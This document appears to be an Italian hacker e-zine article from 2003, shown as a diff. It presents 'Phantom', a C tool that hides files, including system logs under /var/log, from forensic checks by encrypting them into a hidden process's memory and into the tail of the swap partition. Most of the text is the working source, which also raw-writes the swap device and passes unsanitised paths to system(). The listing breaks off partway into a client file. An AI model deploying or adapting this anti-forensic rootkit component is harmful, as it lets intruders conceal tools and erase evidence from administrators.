@@ -1,0 +1,1400 @@
+==============================================================================
+--------------------[ BFi12-dev - file 03 - 14/03/2003 ]----------------------
+==============================================================================
+
+
+-[ DiSCLAiMER ]---------------------------------------------------------------
+        Tutto il materiale contenuto in BFi ha fini eslusivamente informativi
+        ed educativi. Gli autori di BFi non si riterranno in alcun modo
+        responsabili per danni perpetrati a cose o persone causati dall'uso
+        di codice, programmi, informazioni, tecniche contenuti all'interno
+        della rivista.
+        BFi e' libero e autonomo mezzo di espressione; come noi autori siamo
+        liberi di scrivere BFi, tu sei libero di continuare a leggere oppure
+        di fermarti qui. Pertanto, se ti ritieni offeso dai temi trattati
+        e/o dal modo in cui lo sono, * interrompi immediatamente la lettura
+        e cancella questi file dal tuo computer * . Proseguendo tu, lettore,
+        ti assumi ogni genere di responsabilita` per l'uso che farai delle
+        informazioni contenute in BFi.
+        Si vieta il posting di BFi in newsgroup e la diffusione di *parti*
+        della rivista: distribuite BFi nella sua forma integrale ed originale.
+------------------------------------------------------------------------------
+
+
+-[ HACKiNG ]------------------------------------------------------------------
+---[ EPiS0Di0 II: L'ATTACC0 DEi FiLE
+-----[ Dark-Angel <Dark0@angelfire.com>
+
+
+
+		-== Episodio II: L'attacco dei file ==-
+
+Requisiti tecnici:	-= Le libdisasm, reperibili su bastard.sourceforge.net
+			-= Un minimo di conoscenza di C
+
+Requisiti opzionali:	-= Due minuti del vostro prezioso tempo
+	
+Requisiti obbligatori:	-= Un'amica da presentarmi :P
+
+
+-== Overture ==-
+
+Ora una breve analisi di cosa offre il mercato riguardo l'hiding di file.
+Non prendiamo nemmeno in considerazione tools binari che lo fanno, in quanto
+troppo individuabili. L'hiding a kernel space e' gia un'alternativa carina a
+mio avviso, ma se un eventuale controllo del file system dovesse essere
+effettuato con un altro kernel, oppure montando l'hd su un'altra macchina,
+saremmo individuati senza troppi problemi. Per quanto riguarda i "magheggi"
+con gli inode, questi sono interessanti, ma non dobbiamo dimenticare che i
+dati sono fisicamente presenti sul disco fisso percio' una scansione a basso
+livello li farebbe senz'altro saltare fuori.
+Il metodo che illustrero' non vuole essere una panacea, ma diciamo che
+dovrebbe garantire l'immunita' a controlli di questo tipo ed una permanenza un
+po' piu' prolungata :-)
+
+
+-== Let's start ==- 
+
+Prima di tutto dobbiamo svincolarci dal file system e considerare un file per
+quello che e', ovvero un insieme di bit. Sotto quest'ottica tutte le cose sono
+uguali, l'unica differenza tra un file ed un processo ad esempio sarebbe dove
+sono situati questi bit, nel fs per il primo e nella ram per il secondo.
+Allora se sono la stessa cosa perche' non trattarli nello stesso modo? Se ci
+riuscissimo, l'hiding di un file diventerebbe equivalente all'hiding di un
+processo, cosa che sappiamo fare piuttosto bene.
+Se fossimo in grado di replicare, anche in forma piuttosto grezza, un file
+system nella ram si tratterebbe solo di spostare i dati da un fs all'altro,
+cosa tutt'altro che complicata.
+Applicando quest'idea, avremo quindi un processo che fungera' da file system
+virtuale e si occupera' della gestione dei nostri file; per noi sara'
+sufficiente nascondere questo processo affinche' tutti i dati sul fs virtuale
+siano occultati.
+Il tutto avviene senza utilizzare un solo bit del disco fisso.
+Bello, ma cosi' facendo non teniamo conto di 3 cose:
+
+- Osservando la memoria del processo sarebbe possibile leggere il contenuto
+  dei file nascosti.
+- Se saltasse la corrente andrebbe tutto a TR..E (fill the blanks :) .
+- Se la mole dei dati fosse notevole il calo di performance della macchina
+  sarebbe insostenibile.
+
+La prima questione e' facilmente risolvibile con un po' di crittografia,
+mentre per risolvere la seconda e la terza bisogna introdurre un'altra
+cosetta. L'hiding deve essere persistente anche a macchina spenta, ma se
+salviamo su hard disk i file diventano rilevabili... beh, non e' proprio del
+tutto vero: nessuno ci obbliga a salvarli nel fs "dati" (l'ext? per capirci),
+possiamo benissimo sfruttare la partizione di swap.
+Salvando i dati crittati in apposite strutture all'interno della partizione
+di swap possiamo ricaricarli o flusharli a piacimento, cosi' da non occupare
+troppa ram o perdere tutto nel caso di un salto della corrente, ed anche
+un'analisi della swap non farebbe cavare un ragno dal buco dato che crittiamo
+anche li'. Macelli vari derivanti dalla scrittura nello swap sono poco
+probabili, in quanto noi andiamo a scrivere sul fondo della partizione dove,
+in teoria, non dovrebbe esserci scritto nulla, almeno non su un server.
+Ovviamente le uniche operazioni permesse sui file quando sono nascosti in
+questo modo sono quelle messe a disposizione dal nostro vfs: ad esempio, se
+volessimo eseguire un programma nascosto dovremmo rigenerarne l'ELF e poi
+eseguirlo. Durante la permanenza sull'hd sarebbe pero' perfettamente visibile
+... A meno che non provvediamo a nasconderlo in altro modo: sta a voi
+scegliere come, ma per i piu indecisi allego un modulo per l'occultamento che
+lavora sulla filldir piuttosto che sulla controllatissima getdents :)
+
+Nota: ovviamente Phantom crea delle copie nascoste dei file, non nasconde il
+file stesso. Una volta occultato con Phantom dovrete cancellare voi il file.
+
+
+-== Phantom ==-
+
+Una breve descrizione del suo utilizzo. Lanciando il programma senza argomenti
+si ottiene la lista dei comandi:
+Vortex:~# ./Phantom 
+[F]lush	 <--> Forza il salvataggio dei file
+[S]ummon <--> Forza il caricamento dei file
+[L]ist	 <--> Elenca i file memorizzati
+[H]ide <filepath> <--> Nasconde il file specificato
+[M]hide <dir> <--> Nasconde ricorsivamente tutti i file della directory
+[R]ecreate <filepath> <--> Ricrea il file specificato
+[A]llCreation <dir> <--> Ricrea ricorsivamente tutti i file della dir
+[I]nfo <--> Mostra i byte di memoria attualmente utilizzati
+[C]leanup <--> Cancella tutti i file in memoria (volatile)
+[E]rase	<--> Cancella tutti i file flushati
+Vortex:~#
+
+Ok, ora attiviamolo facendo ./Phantom dummy_parameter e prendiamone il pid.
+Mettiamo questo pid in p_config.h e compiliamo client.c (il pid e' opzionale,
+serve solo se volete evitare di scriverlo tutte le volte come argomento quando
+lanciate il client) e digitiamo infine la lettera del comando seguita dai
+parametri.
+
+Ecco un esempio:
+
+Vortex:~# ./client 
+Using hardcoded PID 120
+Insert command:>I
+Memoria usata --> 0
+Insert command:>M /var/log/
+Insert command:>I
+Insert command:>  /* Se non abbiamo output col comando 'I' significa che sta
+		     ancora lavorando e dobbiamo aspettare */
+Insert command:>I
+Memoria usata --> 49999657
+Insert command:>L
+.
+.
+.
+... lista dei file
+Insert command:>A /var/log/ksymoops/
+Insert command:>I
+Memoria usata --> 1513060 /* Eh eh, ce n'erano un po' eh? :P */
+Insert command:>F
+Insert command:>I
+Memoria usata --> 0
+Insert command:>L
+Insert command:>S
+Insert command:>L
+.
+.
+.
+... lista dei file
+
+Ora l'utilizzo dovrebbe essere chiaro :)
+
+
+-== Thanks ==-
+
+Un saluto particolare a xenion, valnir, vecna, delilah`, tinybyte e sgrakkyu
+che sfrutto sempre per i miei test ed a tutti i ragazzi di #phrack.it :)
+
+
+-== I Codici ==-
+
+<-| phantom/Phantom.c |->
+/* Phantom, files hider/manager through fs/RAM/Swap
+ * 
+ * Copyright (c) 2003 Pierre Falda <DarkAngel@antifork.org>
+ *      
+ * Redistribution and use in source and binary forms, with or without
+ * modification, are permitted provided that the following conditions
+ * are met:
+ *
+ * 1. Redistributions of source code must retain the above copyright
+ *    notice, this list of conditions and the following disclaimer.
+ * 2. Redistributions in binary form must reproduce the above copyright
+ *    notice, this list of conditions and the following disclaimer in the
+ *    documentation and/or other materials provided with the distribution.
+ *
+ * THIS SOFTWARE IS PROVIDED BY THE AUTHOR AND CONTRIBUTORS ``AS IS'' AND
+ * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
+ * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
+ * ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHOR OR CONTRIBUTORS BE LIABLE
+ * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
+ * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
+ * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
+ * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
+ * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
+ * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
+ * SUCH DAMAGE.
+ */
+#include <stdio.h>
+#include <sys/types.h>
+#include <sys/stat.h>
+#include <fcntl.h>
+#include <unistd.h>
+#include <string.h>
+#include <stdlib.h>
+#include <signal.h>
+#include <dirent.h>
+#include <ctype.h>
+#include <time.h>
+#include "p_config.h"
+#define GETPARAMETER	do { char *buffer=(char *)calloc(MAXNAMELENGTH+20,sizeof(char));\
+			     char *buffer2;\
+				if(!buffer) {\
+					whooops("Memoria non sufficiente per parsare il comando");\
+					break;\
+				}\
+                             buffer2=(char *)calloc(MAXNAMELENGTH+20,sizeof(char));\
+				if(!buffer2) {\
+					whooops("Memoria non sufficiente per parsare il comando");\
+					free(buffer);\
+					break;\
+				}\
+                        strncpy(buffer2,command,MAXNAMELENGTH+20);\
+                        getdir(buffer,buffer2);\
+                        free(buffer2);
+#define CLOSEGET	free(buffer);\
+			}\
+			while(0);
+
+unsigned long   swapdimension;
+struct nodo    *testa_lista = NULL;
+void            critical(char *);
+
+struct file_entry {
+    char            nome[MAXNAMELENGTH];
+    char            valid[sizeof(VALID)];
+    int             dimensione;
+    void           *data;
+};
+
+
+struct nodo {
+    struct nodo    *next;
+    struct file_entry *slot;
+};
+
+/*
+ * Cryptographic Engine by xenion,only adapted by me 
+ */
+/*
+ * Nulla di spettacolare, giusto per non lavorare in chiaro 
+ */
+unsigned char   key[KEYLEN + 1];
+
+typedef struct {
+    unsigned        b1:1;
+    unsigned        b2:1;
+    unsigned        b3:1;
+    unsigned        b4:1;
+    unsigned        b5:1;
+    unsigned        b6:1;
+    unsigned        b7:1;
+    unsigned        b8:1;
+} bit8;
+
+
+unsigned char  *
+pseudo64(unsigned char Pbyte[])
+{
+
+    bit8            save_up,
+                   *Pbit8;
+
+
+    Pbit8 = (bit8 *) & Pbyte[0];
+    save_up.b1 = Pbit8->b8;
+    Pbyte[0] <<= 1;
+
+    Pbit8 = (bit8 *) & Pbyte[1];
+    save_up.b2 = Pbit8->b8;
+    Pbyte[1] <<= 1;
+    Pbit8->b1 = save_up.b1 ^ Pbit8->b2 ^ Pbit8->b3;
+
+    Pbit8 = (bit8 *) & Pbyte[2];
+    save_up.b3 = Pbit8->b8;
+    Pbyte[2] <<= 1;
+    Pbit8->b1 = save_up.b2 ^ Pbit8->b2 ^ Pbit8->b3;
+
+    Pbit8 = (bit8 *) & Pbyte[3];
+    save_up.b4 = Pbit8->b8;
+    Pbyte[3] <<= 1;
+    Pbit8->b1 = save_up.b3 ^ Pbit8->b2 ^ Pbit8->b3;
+
+    Pbit8 = (bit8 *) & Pbyte[4];
+    save_up.b5 = Pbit8->b8;
+    Pbyte[4] <<= 1;
+    Pbit8->b1 = save_up.b4 ^ Pbit8->b2 ^ Pbit8->b3;
+
+    Pbit8 = (bit8 *) & Pbyte[5];
+    save_up.b6 = Pbit8->b8;
+    Pbyte[5] <<= 1;
+    Pbit8->b1 = save_up.b5 ^ Pbit8->b2 ^ Pbit8->b3;
+
+    Pbit8 = (bit8 *) & Pbyte[6];
+    save_up.b7 = Pbit8->b8;
+    Pbyte[6] <<= 1;
+    Pbit8->b1 = save_up.b6 ^ Pbit8->b2 ^ Pbit8->b3;
+
+    Pbit8 = (bit8 *) & Pbyte[7];
+    save_up.b8 = Pbit8->b8;
+    Pbyte[7] <<= 1;
+    Pbit8->b1 = save_up.b7 ^ Pbit8->b2 ^ Pbit8->b3;
+
+    Pbit8 = (bit8 *) & Pbyte[0];
+    Pbit8->b1 = save_up.b8 ^ save_up.b2 ^ save_up.b3 ^ save_up.b4;
+    Pbit8->b4 = Pbit8->b1 ^ save_up.b5 ^ save_up.b6 ^ save_up.b7;
+
+    return (Pbyte);
+
+}
+
+
+int
+enc(char *path)
+{
+    int             bytes,
+                    i;
+    FILE           *in,
+                   *out;
+    char            buf[KEYLEN];
+    memset(key, 'x', KEYLEN);
+
+    if (!(in = fopen(path, "r")))
+	return -1;
+    if (!(out = fopen(TEMPATH, "w"))) {
+	fclose(in);
+	return -1;
+    }
+
+    strncpy(key, KEY, KEYLEN);
+    for (i = 0; i < 100; i++)
+	pseudo64(key);
+
+
+    while ((bytes = fread(buf, 1, KEYLEN, in)) > 0) {
+	pseudo64(key);
+	for (i = 0; i < bytes; i++)
+	    buf[i] = buf[i] + key[i];
+	fwrite(buf, 1, bytes, out);
+    }
+    fclose(in);
+    fclose(out);
+    return 0;
+
+}
+
+
+int
+dec(char *path)
+{
+
+    int             bytes,
+                    i;
+    FILE           *in,
+                   *out;
+    char            buf[KEYLEN];
+    char           *last;
+    int             posizione,
+                    counter;
+
+    memset(key, 'x', KEYLEN);
+
+    if (!(in = fopen(TEMPATH, "r")))
+	return -1;
+
+    // Con questo arriviamo all'entry esatta
+    last = (char *) strrchr(path, (int) '/');
+    posizione = 1 + (last - path);
+    for (counter = 0; counter < posizione; counter++)
+	if (path[counter] == '/')
+	    do {
+		struct stat     dummy_info;
+		char           *array =
+		    (char *) calloc(counter + 1, sizeof(char));
+		char           *command =
+		    (char *) calloc(MAXNAMELENGTH + 11, sizeof(char));
+		if (!array) {
+		    remove(TEMPATH);
+		    fclose(in);
+		    return -1;
+		}
+		if (!command) {
+		    fclose(in);
+		    free(array);
+		    remove(TEMPATH);
+		    return -1;
+		}
+		memcpy(array, path, counter);
+		if (strlen(array) != 0)
+		    if ((lstat(array, &dummy_info)) < 0) {
+			memcpy(command, "mkdir ", 6);
+			strcat(command, array);
+			system(command);
+			memset(command, '\0', counter + 11);
+			memcpy(command, "chmod +700 ", 11);
+			strcat(command, array);
+			system(command);
+
+		    }
+		free(array);
+		free(command);
+	    }
+	    while (0);
+
+    if (!(out = fopen(path, "w"))) {
+	fclose(in);
+	return -1;
+    }
+    strncpy(key, KEY, KEYLEN);
+    for (i = 0; i < 100; i++)
+	pseudo64(key);
+
+    while ((bytes = fread(buf, 1, KEYLEN, in)) > 0) {
+	pseudo64(key);
+	for (i = 0; i < bytes; i++)
+	    buf[i] = buf[i] - key[i];
+	fwrite(buf, 1, bytes, out);
+    }
+    fclose(in);
+    fclose(out);
+    return 0;
+
+}
+
+/*
+ * End of the cryptographic section 
+ */
+void            check(void);
+void            whooops(char *);
+unsigned long   total_dimension = 0;
+
+int
+cancella_nodo(char *nome)
+{
+    struct nodo    *primo,
+                   *secondo;
+    primo = testa_lista;
+    secondo = primo;
+
+
+    while ((strcmp(secondo->slot->nome, nome))) {
+	primo = secondo;
+	if (secondo)
+	    secondo = secondo->next;
+	else
+	    return 1;
+	if (!(secondo->next))
+	    return 1;
+
+    }
+    if (secondo == testa_lista)
+	testa_lista = primo->next;
+    else
+	primo->next = secondo->next;
+
+    free(secondo->slot->data);
+    free(secondo->slot);
+    secondo->next = NULL;
+    free(secondo);
+    return 0;
+}
+
+struct nodo    *
+crea_nodo(struct file_entry *file)
+{
+    struct nodo    *elemento =
+	(struct nodo *) calloc(1, sizeof(struct nodo));
+    if (!elemento)
+	return NULL;
+    elemento->next = testa_lista;
+    elemento->slot = file;
+    testa_lista = elemento;
+    return testa_lista;
+}
+
+int
+hide_file(char *name)
+{
+    struct stat     info_file;
+    struct file_entry *newborn;
+    void           *data;
+    int             handler;
+    if ((lstat(name, &info_file)) < 0)
+	return -1;
+    if ((total_dimension + sizeof(struct nodo) +
+	 sizeof(struct file_entry) + (int) info_file.st_size) >
+	MAXMEMORYUSAGE) {
+	whooops("Non hai abbastanza memoria!\n");
+	return -1;
+    }
+    if (!
+	(newborn =
+	 (struct file_entry *) calloc(1, sizeof(struct file_entry))))
+	return -1;
+    if (!(data = (void *) calloc(info_file.st_size, sizeof(void)))) {
+	free(newborn);
+	return -1;
+    }
+    if (enc(name) < 0) {
+	free(newborn);
+	free(data);
+	return -1;
+    }
+
+    if ((handler = open(TEMPATH, O_RDONLY)) < 0) {
+
+	free(newborn);
+	free(data);
+	return -1;
+    }
+    if ((read(handler, data, (int) info_file.st_size)) < info_file.st_size) {
+	close(handler);
+	free(newborn);
+	free(data);
+	return -1;
+    }
+    close(handler);
+    strncpy(newborn->nome, name, MAXNAMELENGTH);
+    strncpy(newborn->valid, VALID, sizeof(VALID));
+    newborn->dimensione = (int) info_file.st_size;
+    newborn->data = data;
+
+    if (!crea_nodo(newborn)) {
+	free(newborn);
+	free(data);
+	return -1;
+    }
+    remove(TEMPATH);
+    total_dimension +=
+	(sizeof(struct nodo) + sizeof(struct file_entry) +
+	 newborn->dimensione);
+
+    return 0;
+
+
+}
+
+int
+recreate(char *name, int mode)
+{
+    int             handler;
+    struct nodo    *runner = testa_lista;
+
+    if (mode == SINGLEFILE) {
+	while (runner) {
+	    if (!(strcmp(runner->slot->nome, name))) {
+		if ((handler = open(TEMPATH, O_CREAT | O_WRONLY)) < 0)
+		    return -1;
+		if ((write
+		     (handler, runner->slot->data,
+		      runner->slot->dimensione)) < 0)
+		    return -1;
+		close(handler);
+		if (dec(runner->slot->nome) < 0) {
+		    remove(TEMPATH);
+		    return -1;
+		}
+		remove(TEMPATH);
+		total_dimension -=
+		    (sizeof(struct nodo) + sizeof(struct file_entry) +
+		     runner->slot->dimensione);
+		cancella_nodo(runner->slot->nome);
+		return 0;
+	    } else
+		runner = runner->next;
+	}
+    } else {
+	while (runner) {
+	    if (!(strncmp(runner->slot->nome, name, strlen(name)))) {
+		if ((handler = open(TEMPATH, O_CREAT | O_WRONLY)) < 0) {
+		    return -1;
+		}
+		if ((write
+		     (handler, runner->slot->data,
+		      runner->slot->dimensione)) < 0) {
+		    close(handler);
+		    return -1;
+		}
+		close(handler);
+		if (dec(runner->slot->nome) < 0) {
+		    remove(TEMPATH);
+		    return -1;
+		}
+		remove(TEMPATH);
+		total_dimension -=
+		    (sizeof(struct nodo) + sizeof(struct file_entry) +
+		     runner->slot->dimensione);
+		cancella_nodo(runner->slot->nome);
+		runner = testa_lista;
+	    } else {
+//		printf("->%s<- is the string e non matcha con ->%s<- per i primi %d bytes\n",name,runner->slot->nome,strlen(name));
+		runner = runner->next;
+	    }
+	}
+    }
+    return 0;
+}
+
+int
+hide_dir(char *pathname)
+{
+    struct dirent  *dir_entry;
+    DIR            *dir_stream;
+    struct stat     buf;
+    char           *tempbuf = (char *) calloc(MAXNAMELENGTH, sizeof(char));
+    if (!tempbuf)
+	return -1;
+
+    if (!(dir_stream = opendir(pathname))) {
+	free(tempbuf);
+	whooops("Impossibile aprire la directory base\n");
+	whooops(pathname);
+	return -1;
+    }
+    while ((dir_entry = readdir(dir_stream))) {
+	if ((!(strcmp(dir_entry->d_name, ".")))
+	    || (!(strcmp(dir_entry->d_name, ".."))))
+	    continue;
+	else {
+	    memset(&buf, '\0', sizeof(struct stat));
+	    memset(tempbuf, '\0', MAXNAMELENGTH);
+	    memcpy(tempbuf, pathname, strlen(pathname));
+	    strcat(tempbuf, dir_entry->d_name);
+	    if ((lstat(tempbuf, &buf)) < 0) {
+		whooops("Errore esaminando un'entry: ");
+		whooops(tempbuf);
+		continue;
+	    }
+	    if (S_ISDIR(buf.st_mode)) {
+		do {
+		    char           *artificial =
+			(char *) calloc(strlen(tempbuf) + 1 + 1,
+					sizeof(char));
+		    if (artificial == NULL) {
+			whooops("Sottodirectory non nascosta!->");
+			whooops(tempbuf);
+			continue;
+		    }
+		    memcpy(artificial, tempbuf, (strlen(tempbuf)));
+		    hide_dir(strcat(artificial, "/"));
+		    free(artificial);
+		}
+		while (0);
+		continue;
+
+	    }
+	    memset(tempbuf, '\0', MAXNAMELENGTH);
+	    strncpy(tempbuf, pathname, MAXNAMELENGTH - 256);
+	    strcat(tempbuf, dir_entry->d_name);
+	    if ((hide_file(tempbuf)) < 0) {
+		whooops("File non nascosto!:");
+		whooops(tempbuf);
+		continue;
+	    }
+	}
+    }
+    free(tempbuf);
+    closedir(dir_stream);
+    return 0;
+}
+
+void
+getdir(char *dest, char *src)
+{
+    int             i;
+    char           *start = strchr(src, (int) '/');
+
+    for (i = 0; i < strlen(src); i++)
+	if (*start != '\n')
+	    *dest++ = *start++;
+	else
+	    break;
+
+}
+
+
+void
+getswap(char *dest)
+{
+    int             test = 1;
+    FILE           *filestream;
+    char           *ret,
+                    tempbuf[200] = { '\0' };
+    char            filepath[] = "/etc/fstab";
+    if (!(filestream = fopen(filepath, "r"))) {
+	critical("File delle partizioni non trovato");
+	exit(-1);
+    }
+
+    while ((ret = fgets(tempbuf, 200, filestream))) {
+	if (strstr(tempbuf, "swap"))
+	    break;
+	else {
+	    memset(tempbuf, '\0', 200);
+	    continue;
+	}
+    }
+    fclose(filestream);
+    while (test++ < MAXNAMELENGTH)
+	if ((*ret != '\t') && (*ret != ' '))
+	    *dest++ = *ret++;
+	else
+	    break;
+}
+
+int
+lister(void)
+{
+    FILE           *stream;
+    struct nodo    *dummy;
+
+    if (!(stream = fopen(CONTACT, "a")))
+	return -1;
+    dummy = testa_lista;
+    while (dummy) {
+	fwrite(dummy->slot->nome, sizeof(char), strlen(dummy->slot->nome),
+	       stream);
+	fwrite("\n", sizeof(char), 1, stream);
+	dummy = dummy->next;
+    }
+    fclose(stream);
+    return 0;
+}
+
+int
+to_swap(void)
+{
+    char            swap_path[200] = { '\0' };
+    struct nodo    *dummy;
+    int             handler;
+    getswap(swap_path);
+    if ((handler = open(swap_path, O_RDWR)) < 0)
+	return -1;
+    if ((lseek(handler, -(TRUEMEMORYUSAGE), SEEK_END)) < 0) {
+	close(handler);
+	return -1;
+    }
+    dummy = testa_lista;
+
+    while (dummy) {
+	if (write(handler, dummy->slot, sizeof(struct file_entry)) < 0) {
+	    close(handler);
+	    return -1;
+	}
+	if (write(handler, dummy->slot->data, dummy->slot->dimensione) < 0) {
+	    close(handler);
+	    return -1;
+	}
+	total_dimension -=
+	    (sizeof(struct nodo) + sizeof(struct file_entry) +
+	     dummy->slot->dimensione);
+	cancella_nodo(dummy->slot->nome);
+	dummy = testa_lista;
+    }
+    close(handler);
+    return 0;
+}
+
+int
+regeneration(void)
+{
+    char            swap_path[200] = { '\0' };
+    unsigned long   quanto = 0;
+    struct file_entry *reborn;
+    void           *data;
+    int             handler,
+                    tmp;
+
+    getswap(swap_path);
+    if ((handler = open(swap_path, O_RDONLY)) < 0)
+	return -1;
+    if ((lseek(handler, -(TRUEMEMORYUSAGE), SEEK_END)) == -1) {
+	critical("Problemi con la rigenerazione dei files!!!");
+	exit(-1);
+    }
+
+
+    if (!
+	(reborn =
+	 (struct file_entry *) calloc(1, sizeof(struct file_entry)))) {
+	close(handler);
+	return -1;
+    }
+    while ((tmp = read(handler, reborn, sizeof(struct file_entry))) > 0) {
+	if ((quanto += tmp) > MAXMEMORYUSAGE)
+	    return 0;
+
+	if (!(strstr(reborn->valid, VALID))) {
+	    memset(reborn, '\0', sizeof(struct file_entry));
+	    continue;
+	}
+
+	if (!(data = (void *) calloc(reborn->dimensione, sizeof(void)))) {
+	    memset(reborn, '\0', sizeof(struct file_entry));
+	    continue;		// Se non ha abbastanza spazio prova con
+	    // un'altro
+	}
+
+	read(handler, data, reborn->dimensione);
+	reborn->data = data;
+	if ((crea_nodo(reborn)) < 0) {
+	    memset(reborn, '\0', sizeof(struct file_entry));
+	    continue;
+	}
+
+	total_dimension +=
+	    sizeof(struct nodo) + sizeof(struct file_entry) +
+	    reborn->dimensione;
+	if (!
+	    (reborn =
+	     (struct file_entry *) calloc(1, sizeof(struct file_entry)))) {
+	    close(handler);
+	    return -1;
+	}
+	data = NULL;
+    }
+    free(reborn);
+    close(handler);
+    return 0;
+}
+
+void
+critical(char *message)
+{
+    int             handler;
+
+    if ((handler = open(CONTACT, O_WRONLY)) < 0) {
+	fprintf(stderr,
+		"Wow, fallimento critico nella critical!\n-->%s<--\n",
+		message);
+	exit(-1);
+    }
+    if ((write(handler, message, strlen(message))) < 0) {
+	fprintf(stderr,
+		"Wow, fallimento critico nella critical\n-->%s<--\n",
+		message);
+	exit(-1);
+    }
+    close(handler);
+}
+
+void
+whooops(char *message)
+{
+    int             handler;
+    if ((handler = open(CONTACT, O_WRONLY)) < 0) {
+	fprintf(stderr, "%s\n", message);
+	return;
+    }
+    if ((write(handler, message, strlen(message))) < 0) {
+	fprintf(stderr, "%s\n", message);
+	return;
+    }
+    close(handler);
+}
+
+
+
+void
+commands(void)
+{
+    printf("
+[F]lush	 <--> Forza il salvataggio dei files\n
+[S]ummon <--> Forza il caricamento dei files\n
+[L]ist	 <--> Elenca i files memorizzati\n
+[H]ide <filepath> <--> Nasconde il file specificato\n
+[M]hide <dir> <--> Nasconde ricorsivamente tutti i files della directory\n
+[R]ecreate <filepath> <--> Ricrea il file specificato\n
+[A]llCreation <dir> <--> Ricrea ricorsivamente tutti i files della dir\n
+[I]nfo <--> Mostra i bytes di memoria attualmente utilizzati\n
+[C]leanup <--> Cancella tutti i files in memoria\n
+[E]rase	<--> Cancella tutti i file flushati\n\n");
+    exit(0);
+}
+
+void
+memory(void)
+{
+    FILE           *stream;
+
+    if (!(stream = fopen(CONTACT, "a")))
+	return;
+    fprintf(stream, "Memoria usata --> %ld\n", total_dimension);
+    fclose(stream);
+}
+
+int
+erase(void)
+{
+    int             handler;
+    char           *infinite = (char *) calloc(1, sizeof(char));
+    char            swap_path[200] = { '\0' };
+    int             i;
+    memset(infinite, '\0', sizeof(char));
+    getswap(swap_path);
+
+    if ((handler = open(swap_path, O_RDWR)) < 0) {
+	free(infinite);
+	return -1;
+    }
+
+    if ((lseek(handler, -(TRUEMEMORYUSAGE), SEEK_END)) <
+	-(TRUEMEMORYUSAGE)) {
+	free(infinite);
+	return -1;
+    }
+
+    for (i = 0; i < MAXMEMORYUSAGE; i++)
+	write(handler, infinite, 1);
+    free(infinite);
+    close(handler);
+    return 0;
+}
+
+void
+cleanup(void)
+{
+    struct nodo    *hunter,
+                   *back;
+    int             dimensione;
+    hunter = testa_lista;
+    while (hunter) {
+	back = hunter->next;
+	dimensione = hunter->slot->dimensione;
+	if (!(cancella_nodo(hunter->slot->nome)))
+	    total_dimension -=
+		(sizeof(struct nodo) + sizeof(struct file_entry) +
+		 dimensione);
+	hunter = back;
+    }
+}
+int
+main(int argc, char *argv[])
+{
+    void            backup();
+    void            fuck();
+    if (argc == 1)
+	commands();
+
+
+    if (fork()) {
+	printf("Phantom started\n");
+	exit(0);
+    }
+
+    check();
+    signal(SIGTERM, backup);
+    signal(SIGHUP, backup);
+    signal(SIGSEGV, backup);
+    signal(SIGSTKFLT, fuck);
+
+    regeneration();
+    recreate("/",DIRECTORY);
+    while (1)
+	    sleep(10000000);
+
+    return 0;
+
+}
+
+void
+backup(void)
+{
+    to_swap();
+}
+void
+check(void)
+{
+    int             opened;
+    char           *swapname =
+	(char *) calloc(MAXNAMELENGTH, sizeof(char));
+    getswap(swapname);
+    if ((opened = open(swapname, O_RDWR)) < 0) {
+	critical("Impossibile aprire la swap!");
+	free(swapname);
+	exit(-1);
+    }
+    if ((swapdimension = lseek(opened, 0, SEEK_END)) < TRUEMEMORYUSAGE) {
+	critical("Non c'e' abbastanza spazio nella swap!");
+	close(opened);
+	free(swapname);
+	exit(-1);
+    }
+    close(opened);
+    free(swapname);
+}
+void
+fuck(void)
+{
+    char            command[MAXNAMELENGTH + 20] = { '\0' };
+    FILE           *stream;
+
+    if (!(stream = fopen(INPUT, "rw")))
+	return;
+
+    while (fgets(command, MAXNAMELENGTH + 20, stream)) {
+	switch (command[0]) {
+
+	case 'F':
+	    if ((to_swap()) < 0)
+		whooops("Swapping non riuscito\n");
+	    break;
+	case 'S':
+	    if ((regeneration()) < 0)
+		whooops("Summoning non riuscito\n");
+	    break;
+	case 'L':
+	    if ((lister()) < 0)
+		whooops("Listing non riuscito\n");
+	    break;
+	case 'H':
+	    GETPARAMETER if ((hide_file(buffer)) < 0)
+		whooops("Hiding non riuscito\n");
+	    CLOSEGET        break;
+	case 'M':
+	    GETPARAMETER if ((hide_dir(buffer)) < 0)
+		whooops("Hiding non riuscito\n");
+	    CLOSEGET        break;
+	case 'R':
+	    GETPARAMETER if ((recreate(buffer, SINGLEFILE)) < 0)
+		whooops("Recreating non riuscito\n");
+	    CLOSEGET        break;
+	case 'A':
+	    GETPARAMETER if ((recreate(buffer, DIRECTORY)) < 0)
+		whooops("Recreating non riuscito\n");
+	    CLOSEGET        break;
+	case 'I':
+	    memory();
+	    break;
+	case 'C':
+	    cleanup();
+	    break;
+	case 'E':
+	    if ((erase()) < 0)
+		whooops("Erasing non ruscito\n");
+	    break;
+
+	}
+	memset(command, '\0', MAXNAMELENGTH + 20);
+    }
+    fclose(stream);
+    remove(INPUT);
+}
+<-X->
+
+<-| phantom/Client.c |->
+/*
+ * Silly raw client for Phantom
+ * 
+ * THIS SOFTWARE IS PROVIDED BY THE AUTHOR AND CONTRIBUTORS ``AS IS'' AND
+ * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
+ * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
+ * ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHOR OR CONTRIBUTORS BE LIABLE
+ * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
+ * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
+ * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
